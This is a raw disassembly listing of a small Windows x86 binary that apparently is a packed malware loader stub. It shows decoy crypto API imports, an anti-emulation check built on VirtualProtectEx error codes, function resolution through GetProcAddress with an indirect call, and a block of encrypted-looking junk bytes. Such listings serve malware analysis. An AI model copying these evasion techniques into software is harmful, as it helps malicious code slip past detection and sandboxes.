0x00401000:	pushl	%ebp	; from: 0x004169a1(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x70, %esp
0x00401006:	movl	$0x0, -72(%ebp)
0x0040100d:	movl	$0x0, -24(%ebp)
0x00401014:	movl	$0x0, -112(%ebp)
0x0040101b:	movl	$0x0, -96(%ebp)
0x00401022:	movl	$0x0, -8(%ebp)
0x00401029:	movl	$0x0, -108(%ebp)
0x00401030:	movl	$0x0, -104(%ebp)
0x00401037:	movl	$0x0, -20(%ebp)
0x0040103e:	movl	$0x0, -76(%ebp)
0x00401045:	movl	$0x0, -16(%ebp)
0x0040104c:	movl	$0x0, -88(%ebp)
0x00401053:	movl	$0x0, -4(%ebp)
0x0040105a:	movl	$0x0, -92(%ebp)
0x00401061:	movl	$0x0, -48(%ebp)
0x00401068:	movl	$0x0, -84(%ebp)
0x0040106f:	movl	$0x0, -44(%ebp)
0x00401076:	movl	$0x0, -80(%ebp)
0x0040107d:	movl	$0x0, -12(%ebp)
0x00401084:	movl	0x004493e8, %eax
0x00401089:	movl	%eax, -40(%ebp)
0x0040108c:	movl	0x004493ec, %ecx
0x00401092:	movl	%ecx, -36(%ebp)
0x00401095:	movl	0x004493f0, %edx
0x0040109b:	movl	%edx, -32(%ebp)
0x0040109e:	movb	0x004493f4, %al
0x004010a3:	movb	%al, -28(%ebp)
0x004010a6:	movl	0x004493f8, %ecx
0x004010ac:	movl	%ecx, -64(%ebp)
0x004010af:	movl	0x004493fc, %edx
0x004010b5:	movl	%edx, -60(%ebp)
0x004010b8:	movl	0x00449400, %eax
0x004010bd:	movl	%eax, -56(%ebp)
0x004010c0:	movw	0x00449404, %cx
0x004010c7:	movw	%cx, -52(%ebp)
0x004010cb:	movb	0x00449406, %dl
0x004010d1:	movb	%dl, -50(%ebp)
0x004010d4:	movl	$0x40, -48(%ebp)
0x004010db:	leal	-64(%ebp), %eax
0x004010de:	pushl	%eax
0x004010df:	leal	-16(%ebp), %ecx
0x004010e2:	pushl	%ecx
0x004010e3:	call	ConvertSidToStringSidW@advapi32.dll	; targets: 0xff0000b0(MAY)
0x004010e9:	testl	%eax, %eax
0x004010eb:	je	0x0041534a	; targets: 0x004010f1(MAY), 0x0041534a(MAY)
0x004010f1:	pushl	$0x1	; from: 0x004010eb(MAY)
0x004010f3:	leal	-16(%ebp), %edx
0x004010f6:	pushl	%edx
0x004010f7:	call	DeleteAce@advapi32.dll	; targets: 0xff0000e0(MAY)
0x004010fd:	leal	-16(%ebp), %eax
0x00401100:	pushl	%eax
0x00401101:	pushl	$0x0
0x00401103:	pushl	$0x0
0x00401105:	pushl	$0x1
0x00401107:	call	CreateWellKnownSid@advapi32.dll	; targets: 0xff000030(MAY)
0x0040110d:	movl	-16(%ebp), %ecx
0x00401110:	addl	$0x1, %ecx
0x00401113:	movl	%ecx, -16(%ebp)
0x00401116:	leal	-48(%ebp), %edx
0x00401119:	pushl	%edx
0x0040111a:	leal	-80(%ebp), %eax
0x0040111d:	pushl	%eax
0x0040111e:	pushl	$0x40
0x00401120:	pushl	$0x7
0x00401122:	pushl	$0x0
0x00401124:	movl	-80(%ebp), %ecx
0x00401127:	pushl	%ecx
0x00401128:	call	CryptExportKey@advapi32.dll	; targets: 0xff000040(MAY)
0x0040112e:	leal	-80(%ebp), %edx
0x00401131:	pushl	%edx
0x00401132:	pushl	$0x0
0x00401134:	pushl	$0x8003
0x00401139:	movl	-80(%ebp), %eax
0x0040113c:	pushl	%eax
0x0040113d:	call	CryptGenKey@advapi32.dll	; targets: 0xff000070(MAY)
0x0041534a:	call	GetLastError@kernel32.dll	; targets: 0xff000050(MAY)	; from: 0x004010eb(MAY)
0x00415350:	movl	%eax, -44(%ebp)
0x00415353:	movzwl	-44(%ebp), %edx
0x00415357:	cmpl	$0x539, %edx
0x0041535d:	jne	0x0041538e	; targets: 0x0041535f(MAY), 0x0041538e(MAY)
0x0041535f:	movl	$0xe0d, -20(%ebp)	; from: 0x0041535d(MAY)
0x00415366:	leal	-40(%ebp), %eax
0x00415369:	pushl	%eax
0x0041536a:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000020(MAY)
0x00415370:	movl	%eax, -96(%ebp)
0x00415373:	movl	$0x3a, -84(%ebp)
0x0041537a:	movb	$0x0, -52(%ebp)
0x0041537e:	movl	$0xed6cabff, -8(%ebp)
0x00415385:	movl	$0x10acf7, -104(%ebp)
0x0041538c:	jmp	0x00415395	; targets: 0x00415395(MAY)
0x0041538e:	movb	$0x0, 0x00419f40	; from: 0x0041535d(MAY)
0x00415395:	pushl	$0x0	; from: 0x0041538c(MAY)
0x00415397:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000020(MAY)
0x0041539d:	movl	%eax, -44(%ebp)
0x004153a0:	pushl	GetModuleHandleA@kernel32.dll
0x004153a6:	popl	%edx
0x004153a7:	movl	%edx, -108(%ebp)
0x004153aa:	leal	-64(%ebp), %ecx
0x004153ad:	pushl	%ecx
0x004153ae:	movl	-96(%ebp), %edx
0x004153b1:	pushl	%edx
0x004153b2:	call	GetProcAddress@kernel32.dll	; targets: 0xff000080(MAY)
0x004153b8:	movl	%eax, -68(%ebp)
0x004153bb:	pushl	-48(%ebp)
0x004153be:	pushl	$0x1000
0x004153c3:	movl	-20(%ebp), %eax
0x004153c6:	addl	$0x23, %eax
0x004153c9:	addl	$0x23, %eax
0x004153cc:	pushl	%eax
0x004153cd:	xorl	%eax, %eax
0x004153cf:	pushl	%eax
0x004153d0:	movl	-68(%ebp), %ecx
0x004153d3:	call	%ecx	; targets: unresolved

start:
0x0041547e:	pushl	%ebp
0x0041547f:	movl	%esp, %ebp
0x00415481:	subl	$0x54, %esp
0x00415484:	movl	$0x0, -52(%ebp)
0x0041548b:	movl	$0x0, -4(%ebp)
0x00415492:	movl	$0x0, -80(%ebp)
0x00415499:	movl	$0x0, -76(%ebp)
0x004154a0:	movl	$0x0, -48(%ebp)
0x004154a7:	leal	-72(%ebp), %eax
0x004154aa:	pushl	%eax
0x004154ab:	call	GetLocalTime@kernel32.dll	; targets: 0xff000090(MAY)
0x004154b1:	movl	-52(%ebp), %ecx
0x004154b4:	pushl	%ecx
0x004154b5:	call	0x004154e4	; targets: 0x004154e4(MAY)
0x004154ba:	addl	$0x4, %esp	; from: 0x004169af(MAY)
0x004154bd:	call	0x004169b0	; targets: 0x004169b0(MAY)
0x004154c2:	movl	$0x0, -84(%ebp)	; from: 0x004169be(MAY)
0x004154c9:	jmp	0x004154d4	; targets: 0x004154d4(MAY)
0x004154cb:	movl	-84(%ebp), %edx	; from: 0x004154da(MAY)
0x004154ce:	addl	$0x1, %edx
0x004154d1:	movl	%edx, -84(%ebp)
0x004154d4:	cmpl	$0x64, -84(%ebp)	; from: 0x004154c9(MAY)
0x004154d8:	jae	0x004154dc	; targets: 0x004154da(MAY)
0x004154da:	jmp	0x004154cb	; targets: 0x004154cb(MAY)	; from: 0x004154d8(MAY)
0x004154e4:	pushl	%ebp	; from: 0x004154b5(MAY)
0x004154e5:	movl	%esp, %ebp
0x004154e7:	subl	$0x3c, %esp
0x004154ea:	pushl	%esi
0x004154eb:	movl	$0x0, -60(%ebp)
0x004154f2:	movl	$0x0, -56(%ebp)
0x004154f9:	movl	$0x0, -48(%ebp)
0x00415500:	movl	$0x0, -36(%ebp)
0x00415507:	movl	$0x0, -28(%ebp)
0x0041550e:	movl	$0x0, -40(%ebp)
0x00415515:	movl	$0x449408, -44(%ebp)
0x0041551c:	movl	$0xe178f388, -36(%ebp)
0x00415523:	movl	$0x0, -52(%ebp)
0x0041552a:	movl	-36(%ebp), %eax
0x0041552d:	movl	%eax, -32(%ebp)
0x00415530:	movl	$0x0, -4(%ebp)
0x00415537:	movl	GetLastError@kernel32.dll, %ecx
0x0041553d:	movl	%ecx, -4(%ebp)
0x00415540:	pushl	$0x0
0x00415542:	pushl	$0x4e
0x00415544:	pushl	$0x1e
0x00415546:	pushl	$0x0
0x00415548:	pushl	$0xffffffff
0x0041554a:	call	VirtualProtectEx@kernel32.dll	; targets: 0xff0000c0(MAY)
0x00415550:	testl	%eax, %eax
0x00415552:	je	0x0041698f	; targets: 0x00415558(MAY), 0x0041698f(MAY)
0x00415558:	orb	$0x50, %al	; from: 0x00415552(MAY)
0x0041555a:	das	
0x0041555b:	orb	$0xffffff83, %al
0x0041555d:	pushl	%ds
0x0041555e:	stosl	%eax, %es:(%edi)
0x0041555f:	movsl	%ds:(%esi), %es:(%edi)
0x00415560:	testb	$0xffffffcd, %al
0x00415562:	pushl	%ebx
0x00415563:	nop	
0x00415564:	sarl	-2135638262(%esi)
0x0041556a:	pushl	%ds
0x0041556b:	stosl	%eax, %es:(%edi)
0x0041556c:	movsl	%ds:(%esi), %es:(%edi)
0x0041556d:	lodsb	%ds:(%esi), %al
0x0041556e:	int	$0x53
0x00415570:	shrb	(%esi)
0x00415572:	incl	%ecx
0x00415573:	orb	-1424064500(%edi), %bh
0x00415579:	movsl	%ds:(%esi), %es:(%edi)
0x0041557a:	lodsb	%ds:(%esi), %al
0x0041557b:	int	$0x53
0x0041557d:	nop	
0x0041557e:	incl	%ecx
0x00415580:	orb	-1424064500(%edi), %bh
0x00415586:	movsl	%ds:(%esi), %es:(%edi)
0x00415587:	lodsb	%ds:(%esi), %al
0x00415588:	int	$0x53
0x0041558a:	nop	
0x0041558b:	incl	%ecx
0x0041558d:	orb	-1424064500(%edi), %bh
0x00415593:	movsl	%ds:(%esi), %es:(%edi)
0x00415594:	movsb	%ds:(%esi), %es:(%edi)
0x00415595:	int3	
0x0041698f:	movl	-4(%ebp), %esi	; from: 0x00415552(MAY)
0x00416992:	call	%esi	; targets: 0xff000050(MAY)
0x00416994:	movl	%eax, -56(%ebp)
0x00416997:	cmpl	$0x57, -56(%ebp)
0x0041699b:	jne	0x004169a9	; targets: 0x004169a9(MAY), 0x0041699d(MAY)
0x0041699d:	movl	-32(%ebp), %edx	; from: 0x0041699b(MAY)
0x004169a0:	pushl	%edx
0x004169a1:	call	0x00401000	; targets: 0x00401000(MAY)
0x004169a9:	xorl	%eax, %eax	; from: 0x0041699b(MAY)
0x004169ab:	popl	%esi
0x004169ac:	movl	%ebp, %esp
0x004169ae:	popl	%ebp
0x004169af:	ret	; targets: 0x004154ba(MAY)

0x004169b0:	pushl	%ebp	; from: 0x004154bd(MAY)
0x004169b1:	movl	%esp, %ebp
0x004169b3:	subl	$0x124, %esp
0x004169b9:	xorl	%eax, %eax
0x004169bb:	movl	%ebp, %esp
0x004169bd:	popl	%ebp
0x004169be:	ret	; targets: 0x004154c2(MAY)

